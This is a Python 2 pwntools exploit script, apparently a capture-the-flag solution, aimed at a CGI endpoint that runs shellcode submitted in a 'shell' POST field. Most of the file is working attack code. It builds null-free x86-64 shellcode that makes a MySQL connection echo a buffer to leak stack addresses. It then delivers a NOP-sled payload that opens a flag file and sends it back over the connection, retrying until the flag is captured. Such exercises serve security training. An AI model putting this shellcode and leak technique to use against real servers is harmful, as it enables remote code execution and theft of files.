#!/usr/bin/env python2

import sys
import requests
import re
from subprocess import check_call
from os.path import exists, dirname, join, abspath
from pwn import *
import logging
import hashlib
from time import sleep
import traceback
from termcolor import cprint

# import httplib as http_client
# http_client.HTTPConnection.debuglevel = 1
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True

context.clear(arch="amd64")
DEBUG = len(sys.argv) == 4 and sys.argv[3] == "debug"
if DEBUG:
    TIMEOUT = 3600
else:
    TIMEOUT = 1

def build_leak_assembly(*argv):
    """
    Leaks the EBP of previous frame (saved EBP)
    :param argv: expecting 1 arg -> buffer length
    :type argv:
    :return: assembly needed to run buffer filling query
    :rtype:
    """
    bufferlen = argv[0]
    u = make_unpacker(64, endian='big', sign='unsigned')

    endmarker = "B"*34 + "MISSSING" + "DDDDDD"
    bufferlen = bufferlen - len(endmarker)

    ts = '\x03select concat(repeat("A",{}), "{}")  from Players LIMIT 1;'.format(bufferlen, endmarker)
    ts = ts[::-1] #reverse string
    spaces = len(ts) % 8
    spaces = spaces if spaces == 0 else 8 - spaces  # evens out to multiple of 8

    outs = "    //{}\n    xor rax, rax\n    push rax\n".format(ts[::-1].ljust(len(ts) + spaces, "_"))
    ts = ts.rjust(len(ts) + spaces, " ")

    for i in range(0, len(ts), 8):
        outs += "    mov rcx, 0x{:x}\n    push rcx\n".format(u(ts[i:i + 8]))
    outs += """    xor rcx, rcx

        mov cl, {}
        mov [rsp-0x4], ecx
        lea rsi, [rsp-0x4]

        // syscall 1 (write)
        mov al, 1

        // fd 4 (mysql)
        xor rdi, rdi
        inc rdi
        inc rdi
        inc rdi
        inc rdi

        xor rdx, rdx
        mov dl, {}
        syscall
        """.format(len(ts), len(ts) + 4)
    return outs


def build_flag_assembly(*argv):
    bufferlen = argv[0] -1
    payload_loc = argv[1]
    u = make_unpacker(64, endian='big', sign='unsigned')
    payload = "nop\n"*38 + """
        mov rax, 0x0067616c662f2f2f # null terminated '///flag'
        push rax
        mov rdi, rsp      #param1 rdi, file location == ///flag 
        xor rsi, rsi      #param2 rsi, open mode == 0 (read)
        xor rax, rax
        mov al, 2         #syscall open
        syscall
        mov rdi, rax
        sub dil, 2       #param1 rdi, outgoing fd == opened fd (rax) - 2
        mov rsi, rax	 #param2 rsi, incoming fd == opened fd (rax)
        xor rdx, rdx	 #param3 rdx, offset == 0
        mov r10b, 255	 #param4 r10, count == 255
        mov al, 40		 #syscal sendfile
        syscall       
        mov rax, 60
        xor rdi, rdi
        syscall
    """
    payload_asm = asm(payload)
    diff = argv[2]

    payload_loc = payload_loc - diff

    NOP_boost = 270

    new_load_loc = p64(payload_loc - len(payload_asm) - NOP_boost )

    print("\t\tUsing shellcode stack position: {:08x} {} with diff of {:x}".format(payload_loc - len(payload_asm) + NOP_boost, repr(new_load_loc), diff) )

    payload_asm += new_load_loc * 5
    payload_asm_len = len(payload_asm)
    bufferlen = bufferlen - payload_asm_len

    # WEEEEEEE! a SQL printed NOP SLED, directly into the payload assembly
    ts = '\x03select concat(repeat("\x90",{}), "{}") from Players LIMIT 1;'.format(bufferlen, payload_asm)

    ts = ts[::-1]  # reverse string
    spaces = len(ts) % 8
    spaces = spaces if spaces == 0 else 8 - spaces  # evens out to multiple of 8

    outs = "    //{}\n    xor rax, rax\n    push rax\n".format(ts[::-1].ljust(len(ts) + spaces, "_"))
    ts = ts.rjust(len(ts) + spaces, " ")

    for i in range(0, len(ts), 8):
        outs += "    mov rcx, 0x{:08x}\n    push rcx\n".format(u(ts[i:i + 8]))

    outs += """    xor rcx, rcx

        mov cl, {}
        mov [rsp-0x4], ecx
        lea rsi, [rsp-0x4]
       
        mov al, 1    #syscall write 

        xor rdi, rdi #p1(rdi), output fd == 4
        inc rdi
        inc rdi
        inc rdi
        inc rdi

        xor rdx, rdx 
        mov dl, {}  #p3(rdx), write out count == len of the sql
        syscall
        
        // add in a second read from the mysql server (plus the one in the template)

        xor rax, rax   #p3(rdx) count == make buffers big again 8160
        mov al, 0xff
        shl rax, 5
    
        sub rsp, rax   #creating enough space on stack for incoming buffer
    
        xor rdi, rdi   #p1(rdi), input fd == 4
        inc rdi
        inc rdi
        inc rdi
        inc rdi
    
        // %buf (sp)
        mov rsi, rsp 
    
        mov rdx, rax    #p3(rdx) count == make buffers big again 8160
        
        xor rax, rax   #syscall read
        syscall
        """.format(len(ts), len(ts) + 4)

    return outs


def build_shellcode(payload_builder, *argv):
    shellfn = "shellcode.template"
    path = dirname(abspath(__file__))
    shellfilepath = join(path, shellfn)
    assembly = open(shellfilepath, "r").read()

    assembly = assembly.replace("{{{PAYLOAD_STR}}}", payload_builder(*argv))

    try:
        shellcode = asm(assembly)
    except Exception as ex:
        print(assembly)
        raise ex

    # make sure assembly doesn't rely on nasty \x00
    shellcode = pwnlib.encoders.encoder.null(shellcode)

    #print("\t\tEncoded Shellcode len = {} bytes".format(len(shellcode)))
    assert "\x00" not in shellcode
    return shellcode

def get_frame_address( url):

    payload = {'shell': build_shellcode(build_leak_assembly, 1243)}
    # print(repr(payload))
    r = requests.post(url + "cgi-bin/index.php", data=payload)
    try:
        if len(r.text) < 1388 and DEBUG:
            print("\tResponse too short to retrieve address")
            print("-" * 80)
            print("{}".format(repr(r.text)))
            print("-" * 80)

        str_addr = r.text[1380:1388]
        str_addr = str_addr.encode('latin-1')
        funcfrm1 = u64(str_addr)
        #print("\t[{}] First Function Frame Address = {} ".format(x + 1, funcfrm1))
        return funcfrm1
    except Exception as ex:
        if DEBUG:
            print("\tException during parsing of address {}".format(ex))

    return -1



def main():
    if len(sys.argv) != 3 and len(sys.argv) != 4:
        print ("usage: exploit.py <ip> <port>")
        sys.exit(-1)
    ip = sys.argv[1]
    port = int(sys.argv[2])

    url = "http://%s:%s/" % (ip, port)
    diffs = {}
    for x in range(0, 100):
        try:

            print("[{}] Exploit Starting ".format(x + 1))

            # KiLL KiLL KiLL  KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL
            payload = {'shell': build_shellcode(build_leak_assembly, 2000)}
            r = requests.post(url + "cgi-bin/index.php", data=payload)
            #print(repr(r.text))
            sleep(.1)
            #going for address 2, to compute difference

            ff1 = get_frame_address(url)
            if ff1 == -1:
                continue

            ff2 = get_frame_address(url)
            if ff2 == -1:
                continue

            diff = ff1 - ff2
            print("\t[{}] Address 1 {:x}, Address 2 {:x}, difference = {:x}, {:x}".format(x + 1, ff1, ff2, diff, diff))

            # KiLL KiLL KiLL  KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL KiLL
            payload = {'shell': build_shellcode(build_leak_assembly, 1337)}
            requests.post(url + "cgi-bin/index.php", data=payload)
            sleep(.1)

            ff1 = get_frame_address(url)

            exploit_payload = {'shell': build_shellcode(build_flag_assembly, 1273, ff1, diff)}

            r = requests.post(url + "cgi-bin/index.php", data=exploit_payload, timeout=TIMEOUT)
            res = re.search("(OOO{.+})", r.text)

            if res is None:
                cprint("\t[{}] Exploit failed! Response length = {}".format(x + 1, len(r.text)), "red")
                print("-" * 80)
                print("{}".format(repr(r.text)))
                print("-" * 80)
            else:
                cprint("\nFLAG:{}\n".format(res.groups()[0]), "green")
                break

        except KeyboardInterrupt:

            print("Ok ok, quitting")
            sys.exit(1)

        except Exception as exc:
            if DEBUG:
                print(exc)
                traceback.print_exc()

if __name__ == '__main__':
    main()
    
